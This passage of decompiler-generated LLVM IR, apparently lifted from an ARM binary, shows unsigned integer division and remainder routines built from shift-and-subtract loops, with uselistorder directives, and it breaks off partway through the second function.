  uselistorder i32 %v5_1173c, { 1, 0 }
  uselistorder i1 %v3_11738, { 1, 0 }
  uselistorder i32 %v0_11734, { 1, 0 }
  uselistorder i1 %v7_11720, { 1, 0 }
  uselistorder i32 %v1_11710, { 0, 1, 3, 2 }
  uselistorder i32 %v2_116fc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_116dc, { 1, 2, 3, 0 }
  uselistorder i32 %v3_116c0, { 1, 0, 2, 3, 4 }
  uselistorder i1 %phitmp, { 1, 0 }
  uselistorder i1 %v3_11664, { 1, 0, 2, 3 }
  uselistorder i32 %v0_11654, { 0, 2, 1 }
  uselistorder i32* %stack_var_-28, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 7, 6, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 14, 9, 10, 11, 12, 13 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_11754, { 1, 0 }
  uselistorder label %dec_label_pc_116f8, { 1, 0 }
  uselistorder label %bb37, { 1, 0 }
  uselistorder label %dec_label_pc_11678, { 2, 1, 0 }
}

define i32 @function_11768() local_unnamed_addr {
dec_label_pc_11768:
  %v0_11768 = load i32, i32* @r1, align 4
  %v1_11768 = add i32 %v0_11768, -1
  %v7_11768 = icmp eq i32 %v0_11768, 1
  br i1 %v7_11768, label %bb, label %bb82

bb:                                               ; preds = %dec_label_pc_11768
  %v2_1176c = load i32, i32* @r0, align 4
  ret i32 %v2_1176c

bb82:                                             ; preds = %dec_label_pc_11768
  %v2_11768 = icmp eq i32 %v0_11768, 0
  br i1 %v2_11768, label %dec_label_pc_11850, label %dec_label_pc_11774

dec_label_pc_11774:                               ; preds = %bb82
  %v0_11774 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_11774, %v0_11768
  br i1 %tmp, label %dec_label_pc_1177c, label %dec_label_pc_11808

dec_label_pc_1177c:                               ; preds = %dec_label_pc_11774
  %v2_1177c = and i32 %v1_11768, %v0_11768
  %v4_1177c = icmp eq i32 %v2_1177c, 0
  br i1 %v4_1177c, label %dec_label_pc_11814, label %dec_label_pc_11784

dec_label_pc_11784:                               ; preds = %dec_label_pc_1177c
  %v3_11784 = icmp ult i32 %v0_11768, 536870912
  br i1 %v3_11784, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_11784
  %v4_11788 = mul i32 %v0_11768, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_11784, %.thread
  %v0_117a8.pr36.ph = phi i32 [ %v4_11788, %.thread ], [ %v0_11768, %dec_label_pc_11784 ]
  %storemerge137 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_11784 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb85
  %v0_117a8.pr36 = phi i32 [ %v4_1179c, %bb85 ], [ %v0_117a8.pr36.ph, %.preheader.preheader ]
  %v1_117a0 = phi i32 [ %v4_117a0, %bb85 ], [ %storemerge137, %.preheader.preheader ]
  %v2_11794 = icmp ugt i32 %v0_117a8.pr36, 268435455
  br i1 %v2_11794, label %.thread2, label %bb83

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_117a8thread-pre-split.loopexit

bb83:                                             ; preds = %.preheader
  %v4_11798 = icmp ult i32 %v0_117a8.pr36, %v0_11774
  br i1 %v4_11798, label %bb84, label %dec_label_pc_117a8thread-pre-split.loopexit.loopexit

bb84:                                             ; preds = %bb83
  %v2_1179c = and i32 %v0_117a8.pr36, 268435456
  %v3_1179c = icmp eq i32 %v2_1179c, 0
  %v4_1179c = mul i32 %v0_117a8.pr36, 16
  br i1 %v3_1179c, label %bb85, label %dec_label_pc_117a8.loopexit

bb85:                                             ; preds = %bb84
  %v2_117a0 = and i32 %v1_117a0, 268435456
  %v3_117a0 = icmp eq i32 %v2_117a0, 0
  %v4_117a0 = mul i32 %v1_117a0, 16
  br i1 %v3_117a0, label %.preheader, label %dec_label_pc_117a8thread-pre-split.loopexit.loopexit

dec_label_pc_117a8thread-pre-split.loopexit.loopexit: ; preds = %bb85, %bb83
  %v1_117b448.ph = phi i32 [ %v1_117a0, %bb83 ], [ %v4_117a0, %bb85 ]
  %v0_117a8.pr38.ph = phi i32 [ %v0_117a8.pr36, %bb83 ], [ %v4_1179c, %bb85 ]
  br label %dec_label_pc_117a8thread-pre-split.loopexit

dec_label_pc_117a8thread-pre-split.loopexit:      ; preds = %dec_label_pc_117a8thread-pre-split.loopexit.loopexit, %.thread2
  %v1_117b448 = phi i32 [ %v1_117a0, %.thread2 ], [ %v1_117b448.ph, %dec_label_pc_117a8thread-pre-split.loopexit.loopexit ]
  %v0_117a8.pr38 = phi i32 [ %v0_117a8.pr36, %.thread2 ], [ %v0_117a8.pr38.ph, %dec_label_pc_117a8thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_117a8thread-pre-split

dec_label_pc_117a8thread-pre-split:               ; preds = %dec_label_pc_117a8thread-pre-split.loopexit, %bb87
  %v1_117b446 = phi i32 [ %v1_117b448, %dec_label_pc_117a8thread-pre-split.loopexit ], [ %v3_117b4, %bb87 ]
  %v0_117a8.pr = phi i32 [ %v0_117a8.pr38, %dec_label_pc_117a8thread-pre-split.loopexit ], [ %v3_117b0, %bb87 ]
  br label %dec_label_pc_117a8

dec_label_pc_117a8.loopexit:                      ; preds = %bb84
  br label %dec_label_pc_117a8

dec_label_pc_117a8:                               ; preds = %dec_label_pc_117a8.loopexit, %dec_label_pc_117a8thread-pre-split
  %v1_117b4 = phi i32 [ %v1_117b446, %dec_label_pc_117a8thread-pre-split ], [ %v1_117a0, %dec_label_pc_117a8.loopexit ]
  %v1_117b0 = phi i32 [ %v0_117a8.pr, %dec_label_pc_117a8thread-pre-split ], [ %v4_1179c, %dec_label_pc_117a8.loopexit ]
  %v2_117a8 = icmp slt i32 %v1_117b0, 0
  br i1 %v2_117a8, label %dec_label_pc_117bc, label %bb86

bb86:                                             ; preds = %dec_label_pc_117a8
  %v4_117ac = icmp ult i32 %v1_117b0, %v0_11774
  br i1 %v4_117ac, label %bb87, label %dec_label_pc_117bc

bb87:                                             ; preds = %bb86
  %v3_117b0 = mul i32 %v1_117b0, 2
  %v2_117b4 = icmp slt i32 %v1_117b4, 0
  %v3_117b4 = mul i32 %v1_117b4, 2
  br i1 %v2_117b4, label %dec_label_pc_117bc, label %dec_label_pc_117a8thread-pre-split

dec_label_pc_117bc:                               ; preds = %bb86, %dec_label_pc_117a8, %bb87
  %v2_117c859 = phi i32 [ %v3_117b4, %bb87 ], [ %v1_117b4, %bb86 ], [ %v1_117b4, %dec_label_pc_117a8 ]
  %v1_117c051 = phi i32 [ %v3_117b0, %bb87 ], [ %v1_117b0, %bb86 ], [ %v1_117b0, %dec_label_pc_117a8 ]
  br label %dec_label_pc_117c0

dec_label_pc_117c0:                               ; preds = %.thread11, %dec_label_pc_117bc
  %v1_117f4 = phi i32 [ %v4_117f4, %.thread11 ], [ %v2_117c859, %dec_label_pc_117bc ]
  %v1_117c8 = phi i32 [ %v0_11800, %.thread11 ], [ 0, %dec_label_pc_117bc ]
  %v1_117f8 = phi i32 [ %v4_117f8, %.thread11 ], [ %v1_117c051, %dec_label_pc_117bc ]
  %v1_117c4 = phi i32 [ %v0_117f0, %.thread11 ], [ %v0_11774, %dec_label_pc_117bc ]
  %v3_117c0 = icmp ult i32 %v1_117c4, %v1_117f8
  br i1 %v3_117c0, label %.thread7, label %bb88

bb88:                                             ; preds = %dec_label_pc_117c0
  %v3_117c4 = sub i32 %v1_117c4, %v1_117f8
  %v3_117c8 = or i32 %v1_117c8, %v1_117f4
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_117c0, %bb88
  %v1_117d0 = phi i32 [ %v1_117c4, %dec_label_pc_117c0 ], [ %v3_117c4, %bb88 ]
  %v1_117d4 = phi i32 [ %v1_117c8, %dec_label_pc_117c0 ], [ %v3_117c8, %bb88 ]
  %v4_117cc = udiv i32 %v1_117f8, 2
  %v6_117cc = icmp ult i32 %v1_117d0, %v4_117cc
  br i1 %v6_117cc, label %.thread8, label %bb89

bb89:                                             ; preds = %.thread7
  %v3_117d0 = urem i32 %v1_117f8, 2
  %v4_117d0 = icmp eq i32 %v3_117d0, 0
  %v6_117d0 = sub i32 %v1_117d0, %v4_117cc
  br i1 %v4_117d0, label %.thread8, label %bb90

bb90:                                             ; preds = %bb89
  %v5_117d4 = udiv i32 %v1_117f4, 2
  %v6_117d4 = or i32 %v1_117d4, %v5_117d4
  br label %.thread8

.thread8:                                         ; preds = %bb89, %.thread7, %bb90
  %v1_117dc = phi i32 [ %v6_117d0, %bb89 ], [ %v1_117d0, %.thread7 ], [ %v6_117d0, %bb90 ]
  %v1_117e0 = phi i32 [ %v1_117d4, %bb89 ], [ %v1_117d4, %.thread7 ], [ %v6_117d4, %bb90 ]
  %v4_117d8 = udiv i32 %v1_117f8, 4
  %v6_117d8 = icmp ult i32 %v1_117dc, %v4_117d8
  br i1 %v6_117d8, label %.thread9, label %bb91

bb91:                                             ; preds = %.thread8
  %v3_117dc = and i32 %v1_117f8, 2
  %v4_117dc = icmp eq i32 %v3_117dc, 0
  %v6_117dc = sub i32 %v1_117dc, %v4_117d8
  br i1 %v4_117dc, label %.thread9, label %bb92

bb92:                                             ; preds = %bb91
  %v5_117e0 = udiv i32 %v1_117f4, 4
  %v6_117e0 = or i32 %v1_117e0, %v5_117e0
  br label %.thread9

.thread9:                                         ; preds = %bb91, %.thread8, %bb92
  %v1_117e8 = phi i32 [ %v6_117dc, %bb91 ], [ %v1_117dc, %.thread8 ], [ %v6_117dc, %bb92 ]
  %v1_117ec = phi i32 [ %v1_117e0, %bb91 ], [ %v1_117e0, %.thread8 ], [ %v6_117e0, %bb92 ]
  %v4_117e4 = udiv i32 %v1_117f8, 8
  %v6_117e4 = icmp ult i32 %v1_117e8, %v4_117e4
  br i1 %v6_117e4, label %thread-pre-split, label %bb93

bb93:                                             ; preds = %.thread9
  %v3_117e8 = and i32 %v1_117f8, 4
  %v4_117e8 = icmp eq i32 %v3_117e8, 0
  %v6_117e8 = sub i32 %v1_117e8, %v4_117e4
  br i1 %v4_117e8, label %thread-pre-split, label %bb94

bb94:                                             ; preds = %bb93
  %v5_117ec = udiv i32 %v1_117f4, 8
  %v6_117ec = or i32 %v1_117ec, %v5_117ec
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb94, %.thread9, %bb93
  %v0_11800 = phi i32 [ %v1_117ec, %bb93 ], [ %v1_117ec, %.thread9 ], [ %v6_117ec, %bb94 ]
  %v0_117f0 = phi i32 [ %v6_117e8, %bb93 ], [ %v1_117e8, %.thread9 ], [ %v6_117e8, %bb94 ]
  %v2_117f0 = icmp eq i32 %v0_117f0, 0
  br i1 %v2_117f0, label %dec_label_pc_11800, label %bb95

bb95:                                             ; preds = %thread-pre-split
  %tmp142 = icmp ult i32 %v1_117f4, 16
  br i1 %tmp142, label %dec_label_pc_11800, label %.thread11

.thread11:                                        ; preds = %bb95
  %v4_117f4 = udiv i32 %v1_117f4, 16
  %v4_117f8 = udiv i32 %v1_117f8, 16
  br label %dec_label_pc_117c0

dec_label_pc_11800:                               ; preds = %thread-pre-split, %bb95
  ret i32 %v0_11800

dec_label_pc_11808:                               ; preds = %dec_label_pc_11774
  %v9_11774 = icmp eq i32 %v0_11774, %v0_11768
  %. = zext i1 %v9_11774 to i32
  ret i32 %.

dec_label_pc_11814:                               ; preds = %dec_label_pc_1177c
  %v2_11814 = icmp ugt i32 %v0_11768, 65535
  br i1 %v2_11814, label %bb99, label %.thread16

bb99:                                             ; preds = %dec_label_pc_11814
  %v2_11818 = and i32 %v0_11768, 32768
  %v3_11818 = icmp eq i32 %v2_11818, 0
  %v4_11818 = udiv i32 %v0_11768, 65536
  br i1 %v3_11818, label %.thread16, label %bb100

.thread16:                                        ; preds = %bb99, %dec_label_pc_11814
  %v0_1182465 = phi i32 [ %v0_11768, %dec_label_pc_11814 ], [ %v4_11818, %bb99 ]
  br label %bb100

bb100:                                            ; preds = %bb99, %.thread16
  %v1_11828 = phi i32 [ %v0_1182465, %.thread16 ], [ %v4_11818, %bb99 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb99 ]
  %v2_11824 = icmp ugt i32 %v1_11828, 255
  br i1 %v2_11824, label %bb101, label %.thread17

bb101:                                            ; preds = %bb100
  %v2_11828 = and i32 %v1_11828, 128
  %v3_11828 = icmp eq i32 %v2_11828, 0
  %v4_11828 = udiv i32 %v1_11828, 256
  br i1 %v3_11828, label %.thread17, label %bb102

bb102:                                            ; preds = %bb101
  %v2_1182c = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb101, %bb100, %bb102
  %v1_11838 = phi i32 [ %storemerge, %bb100 ], [ %storemerge, %bb101 ], [ %v2_1182c, %bb102 ]
  %v1_11834 = phi i32 [ %v1_11828, %bb100 ], [ %v4_11828, %bb101 ], [ %v4_11828, %bb102 ]
  %v2_11830 = icmp ugt i32 %v1_11834, 15
  br i1 %v2_11830, label %bb103, label %.thread18

bb103:                                            ; preds = %.thread17
  %v2_11834 = and i32 %v1_11834, 8
  %v3_11834 = icmp eq i32 %v2_11834, 0
  %v4_11834 = udiv i32 %v1_11834, 16
  br i1 %v3_11834, label %.thread18, label %bb104

bb104:                                            ; preds = %bb103
  %v2_11838 = add nsw i32 %v1_11838, 4
  br label %.thread18

.thread18:                                        ; preds = %bb103, %.thread17, %bb104
  %v4_11840 = phi i32 [ %v1_11838, %.thread17 ], [ %v1_11838, %bb103 ], [ %v2_11838, %bb104 ]
  %v5_11844 = phi i32 [ %v1_11834, %.thread17 ], [ %v4_11834, %bb103 ], [ %v4_11834, %bb104 ]
  %v2_1183c = icmp ugt i32 %v5_11844, 3
  %v7_1183c = icmp eq i32 %v5_11844, 4
  %v2_11840 = xor i1 %v7_1183c, true
  %v3_11840 = and i1 %v2_1183c, %v2_11840
  br i1 %v3_11840, label %bb105, label %bb106

bb105:                                            ; preds = %.thread18
  %v5_11840 = add nsw i32 %v4_11840, 3
  br label %bb106

bb106:                                            ; preds = %.thread18, %bb105
  %v4_11844 = phi i32 [ %v4_11840, %.thread18 ], [ %v5_11840, %bb105 ]
  %v2_11844 = xor i1 %v2_1183c, true
  %v3_11844 = or i1 %v7_1183c, %v2_11844
  br i1 %v3_11844, label %bb107, label %bb108

bb107:                                            ; preds = %bb106
  %v8_11844 = udiv i32 %v5_11844, 2
  %v9_11844 = add i32 %v4_11844, %v8_11844
  br label %bb108

bb108:                                            ; preds = %bb106, %bb107
  %v1_11848 = phi i32 [ %v4_11844, %bb106 ], [ %v9_11844, %bb107 ]
  %v6_11848 = lshr i32 %v0_11774, %v1_11848
  ret i32 %v6_11848

dec_label_pc_11850:                               ; preds = %bb82
  %v0_11850 = load i32, i32* @lr, align 4
  %v0_11854 = call i32 @function_11a28()
  store i32 0, i32* @r0, align 4
  call void @__pseudo_branch(i32 %v0_11850)
  %v9_11860 = load i32, i32* @lr, align 4
  %v0_11864 = call i32 @function_11768()
  store i32 %v9_11860, i32* @lr, align 4
  ret i32 %v0_11864

; uselistorder directives
  uselistorder i32 %v4_11844, { 1, 0 }
  uselistorder i1 %v7_1183c, { 1, 0 }
  uselistorder i32 %v4_11834, { 1, 0 }
  uselistorder i32 %v1_11834, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11828, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_11828, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11818, { 1, 0 }
  uselistorder i32 %v0_117f0, { 1, 0 }
  uselistorder i32 %v4_117e4, { 1, 0 }
  uselistorder i32 %v1_117ec, { 1, 2, 0 }
  uselistorder i32 %v4_117d8, { 1, 0 }
  uselistorder i32 %v1_117e0, { 1, 2, 0 }
  uselistorder i32 %v4_117cc, { 1, 0 }
  uselistorder i32 %v1_117d4, { 1, 2, 0 }
  uselistorder i32 %v1_117f8, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_117c8, { 1, 0 }
  uselistorder i32 %v1_117f4, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_117b4, { 1, 0 }
  uselistorder i32 %v3_117b0, { 1, 0 }
  uselistorder i32 %v1_117b0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_117b4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_117a0, { 1, 0 }
  uselistorder i32 %v4_1179c, { 2, 1, 0 }
  uselistorder i32 %v1_117a0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_117a8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_11774, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_11768, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1, 10, 12, 11 }
  uselistorder i32 65535, { 102, 53, 54, 0, 1, 55, 12, 56, 24, 28, 57, 25, 58, 26, 59, 27, 60, 61, 13, 62, 2, 63, 64, 32, 65, 31, 66, 29, 67, 30, 68, 14, 15, 3, 69, 33, 70, 34, 71, 16, 17, 4, 72, 35, 73, 36, 74, 18, 75, 39, 76, 38, 77, 37, 78, 19, 20, 5, 41, 79, 40, 80, 81, 82, 21, 83, 84, 6, 44, 85, 42, 86, 43, 87, 88, 22, 89, 7, 8, 47, 90, 45, 91, 46, 92, 93, 23, 94, 9, 48, 95, 49, 96, 50, 97, 98, 10, 51, 99, 100, 11, 52, 101 }
  uselistorder label %bb108, { 1, 0 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb100, { 1, 0 }
  uselistorder label %dec_label_pc_11800, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_117bc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_117a8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @function_11878(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11878:
  store i32 %arg1, i32* @r0, align 4
  %v1_11878 = add i32 %arg2, -1
  %v2_11878 = icmp eq i32 %arg2, 0
  br i1 %v2_11878, label %dec_label_pc_11934, label %dec_label_pc_11880

dec_label_pc_11880:                               ; preds = %dec_label_pc_11878
  %v7_11878 = icmp eq i32 %arg2, 1
  br i1 %v7_11878, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_11880
  %v1_11880 = load i32, i32* @r0, align 4
  %v10_11880 = icmp eq i32 %v1_11880, %arg2
  br i1 %v10_11880, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_11880, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_11880 = icmp ult i32 %v1_11880, %arg2
  br i1 %v4_11880, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_11888 = and i32 %v1_11878, %arg2
  %v8_11888 = icmp eq i32 %v6_11888, 0
  br i1 %v8_11888, label %.thread67, label %dec_label_pc_11898.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_1188c = phi i32 [ %v1_11880, %bb75 ], [ 0, %.thread65 ]
  %v3_1188c = and i32 %v1_1188c, %v1_11878
  br label %bb76

dec_label_pc_11898.preheader:                     ; preds = %bb75
  %v2_1189899 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1189899, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_11928, %bb74, %bb89, %bb84, %dec_label_pc_118f8, %.thread67
  %v5_11890 = phi i32 [ %v1_11880, %bb74 ], [ %v3_1188c, %.thread67 ], [ %v1_118d4.v6_118d4.v6_118dc.v6_118e4, %dec_label_pc_118f8 ], [ 0, %bb84 ], [ %v1_1192c, %dec_label_pc_11928 ], [ %v2_11928, %bb89 ]
  ret i32 %v5_11890

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_11898.preheader
  %v0_118ac.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_11898.preheader ], [ %v4_118a0, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_11898.preheader ], [ %v2_118a411, %.thread1.thread9 ]
  br label %dec_label_pc_118acthread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_11898.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_118a411, %.thread1.thread9 ], [ 0, %dec_label_pc_11898.preheader ]
  %v0_118ac.pr33100 = phi i32 [ %v4_118a0, %.thread1.thread9 ], [ %arg2, %dec_label_pc_11898.preheader ]
  %v4_1189c = icmp ult i32 %v0_118ac.pr33100, %v1_11880
  br i1 %v4_1189c, label %bb78, label %dec_label_pc_118acthread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_118a0 = and i32 %v0_118ac.pr33100, 268435456
  %v3_118a0 = icmp eq i32 %v2_118a0, 0
  %v4_118a0 = mul i32 %v0_118ac.pr33100, 16
  br i1 %v3_118a0, label %.thread1.thread9, label %dec_label_pc_118ac.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_118a411 = add i32 %storemerge101, 4
  %v2_11898 = icmp ugt i32 %v4_118a0, 268435455
  br i1 %v2_11898, label %.thread, label %bb77

dec_label_pc_118acthread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_118acthread-pre-split.loopexit

dec_label_pc_118acthread-pre-split.loopexit:      ; preds = %dec_label_pc_118acthread-pre-split.loopexit.loopexit, %.thread
  %v0_118ac.pr3398 = phi i32 [ %v0_118ac.pr33.lcssa, %.thread ], [ %v0_118ac.pr33100, %dec_label_pc_118acthread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_118acthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_118acthread-pre-split

dec_label_pc_118acthread-pre-split:               ; preds = %.thread4, %dec_label_pc_118acthread-pre-split.loopexit
  %v1_118b839 = phi i32 [ %storemerge95, %dec_label_pc_118acthread-pre-split.loopexit ], [ %v2_118b8, %.thread4 ]
  %v0_118ac.pr = phi i32 [ %v0_118ac.pr3398, %dec_label_pc_118acthread-pre-split.loopexit ], [ %v3_118b4, %.thread4 ]
  br label %dec_label_pc_118ac

dec_label_pc_118ac.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_118ac

dec_label_pc_118ac:                               ; preds = %dec_label_pc_118ac.loopexit, %dec_label_pc_118acthread-pre-split
  %v0_118c0.pr = phi i32 [ %v1_118b839, %dec_label_pc_118acthread-pre-split ], [ %storemerge101, %dec_label_pc_118ac.loopexit ]
  %v1_118b4 = phi i32 [ %v0_118ac.pr, %dec_label_pc_118acthread-pre-split ], [ %v4_118a0, %dec_label_pc_118ac.loopexit ]
  %v2_118ac = icmp slt i32 %v1_118b4, 0
  br i1 %v2_118ac, label %dec_label_pc_118c0, label %bb79

bb79:                                             ; preds = %dec_label_pc_118ac
  %v4_118b0 = icmp ult i32 %v1_118b4, %v1_11880
  br i1 %v4_118b0, label %.thread4, label %dec_label_pc_118c0

.thread4:                                         ; preds = %bb79
  %v3_118b4 = mul i32 %v1_118b4, 2
  %v2_118b8 = add i32 %v0_118c0.pr, 1
  br label %dec_label_pc_118acthread-pre-split

dec_label_pc_118c0:                               ; preds = %bb79, %dec_label_pc_118ac
  %v2_118c0 = add i32 %v0_118c0.pr, -3
  %v5_118c4 = icmp slt i32 %v0_118c0.pr, 3
  br i1 %v5_118c4, label %dec_label_pc_11904, label %dec_label_pc_118c8

dec_label_pc_118c8:                               ; preds = %dec_label_pc_118c0, %bb83
  %v6_118f0 = phi i32 [ %v0_118f8, %bb83 ], [ %v2_118c0, %dec_label_pc_118c0 ]
  %v1_118cc = phi i32 [ %v1_118d4.v6_118d4.v6_118dc.v6_118e4, %bb83 ], [ %v1_11880, %dec_label_pc_118c0 ]
  %v3_118ec12 = phi i32 [ %v3_118ec, %bb83 ], [ %v1_118b4, %dec_label_pc_118c0 ]
  %v3_118c8 = icmp ult i32 %v1_118cc, %v3_118ec12
  %v3_118cc = select i1 %v3_118c8, i32 0, i32 %v3_118ec12
  %v1_118d4 = sub i32 %v1_118cc, %v3_118cc
  %v4_118d0 = udiv i32 %v3_118ec12, 2
  %v6_118d0 = icmp ult i32 %v1_118d4, %v4_118d0
  %v6_118d4 = select i1 %v6_118d0, i32 0, i32 %v4_118d0
  %v1_118d4.v6_118d4 = sub i32 %v1_118d4, %v6_118d4
  %.demorgan = and i1 %v3_118c8, %v6_118d0
  %v4_118d8 = udiv i32 %v3_118ec12, 4
  %v6_118d8 = icmp ult i32 %v1_118d4.v6_118d4, %v4_118d8
  %v6_118dc = select i1 %v6_118d8, i32 0, i32 %v4_118d8
  %v1_118d4.v6_118d4.v6_118dc = sub i32 %v1_118d4.v6_118d4, %v6_118dc
  %.demorgan71 = and i1 %.demorgan, %v6_118d8
  %v4_118e0 = udiv i32 %v3_118ec12, 8
  %v6_118e0 = icmp ult i32 %v1_118d4.v6_118d4.v6_118dc, %v4_118e0
  %v6_118e4 = select i1 %v6_118e0, i32 0, i32 %v4_118e0
  %v1_118d4.v6_118d4.v6_118dc.v6_118e4 = sub i32 %v1_118d4.v6_118d4.v6_118dc, %v6_118e4
  %.demorgan72 = and i1 %.demorgan71, %v6_118e0
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_118c8
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_118c8, %bb80
  %v2_118e8 = add i32 %v1_118d4.v6_118d4.v6_118dc.v6_118e4, -1
  %v4_118e8 = sub i32 0, %v1_118d4.v6_118d4.v6_118dc.v6_118e4
  %v5_118e8 = and i32 %v1_118d4.v6_118d4.v6_118dc.v6_118e4, %v4_118e8
  %v3_118ec = udiv i32 %v3_118ec12, 16
  %v5_118f0 = icmp slt i32 %v1_118d4.v6_118d4.v6_118dc.v6_118e4, 1
  br i1 %v5_118f0, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_118f0 = add i32 %v6_118f0, -4
  %v9_118f0 = sub i32 3, %v6_118f0
  %v10_118f0 = and i32 %v9_118f0, %v6_118f0
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_118f8 = phi i32 [ %v6_118f0, %bb81 ], [ %v7_118f0, %bb82 ]
  %v0_118f415.in = phi i32 [ %v2_118e8, %bb81 ], [ %v7_118f0, %bb82 ]
  %v1_118f414.in = phi i32 [ %v5_118e8, %bb81 ], [ %v10_118f0, %bb82 ]
  %v1_118f414 = icmp slt i32 %v1_118f414.in, 0
  %v0_118f415 = icmp slt i32 %v0_118f415.in, 0
  %v2_118f4 = xor i1 %v0_118f415, %v1_118f414
  br i1 %v2_118f4, label %dec_label_pc_118f8, label %dec_label_pc_118c8

dec_label_pc_118f8:                               ; preds = %bb83
  %v1_118f8 = urem i32 %v0_118f8, 4
  %v2_118f8 = icmp eq i32 %v1_118f8, 0
  br i1 %v2_118f8, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_118f8
  %v3_118fc = icmp eq i32 %v1_118d4.v6_118d4.v6_118dc.v6_118e4, 0
  br i1 %v3_118fc, label %bb76, label %dec_label_pc_11904

dec_label_pc_11904:                               ; preds = %bb84, %dec_label_pc_118c0
  %v0_11918 = phi i32 [ %v3_118ec, %bb84 ], [ %v1_118b4, %dec_label_pc_118c0 ]
  %v1_11914 = phi i32 [ %v1_118d4.v6_118d4.v6_118dc.v6_118e4, %bb84 ], [ %v1_11880, %dec_label_pc_118c0 ]
  %v0_11904 = phi i32 [ %v0_118f8, %bb84 ], [ %v2_118c0, %dec_label_pc_118c0 ]
  %v5_11908 = icmp slt i32 %v0_11904, -2
  br i1 %v5_11908, label %dec_label_pc_11928, label %dec_label_pc_1190c

dec_label_pc_1190c:                               ; preds = %dec_label_pc_11904
  %v8_11904 = icmp eq i32 %v0_11904, -2
  br i1 %v8_11904, label %dec_label_pc_1191c, label %dec_label_pc_11910

dec_label_pc_11910:                               ; preds = %dec_label_pc_1190c
  %v3_11910 = icmp ult i32 %v1_11914, %v0_11918
  br i1 %v3_11910, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_11910
  %v2_11910 = sub i32 %v1_11914, %v0_11918
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_11910, %bb85
  %v0_1191c52 = phi i32 [ %v1_11914, %dec_label_pc_11910 ], [ %v2_11910, %bb85 ]
  %v3_11918 = udiv i32 %v0_11918, 2
  br label %dec_label_pc_1191c

dec_label_pc_1191c:                               ; preds = %dec_label_pc_1190c, %bb86
  %v0_11924 = phi i32 [ %v0_11918, %dec_label_pc_1190c ], [ %v3_11918, %bb86 ]
  %v1_11920 = phi i32 [ %v1_11914, %dec_label_pc_1190c ], [ %v0_1191c52, %bb86 ]
  %v3_1191c = icmp ult i32 %v1_11920, %v0_11924
  br i1 %v3_1191c, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_1191c
  %v2_1191c = sub i32 %v1_11920, %v0_11924
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_1191c, %bb87
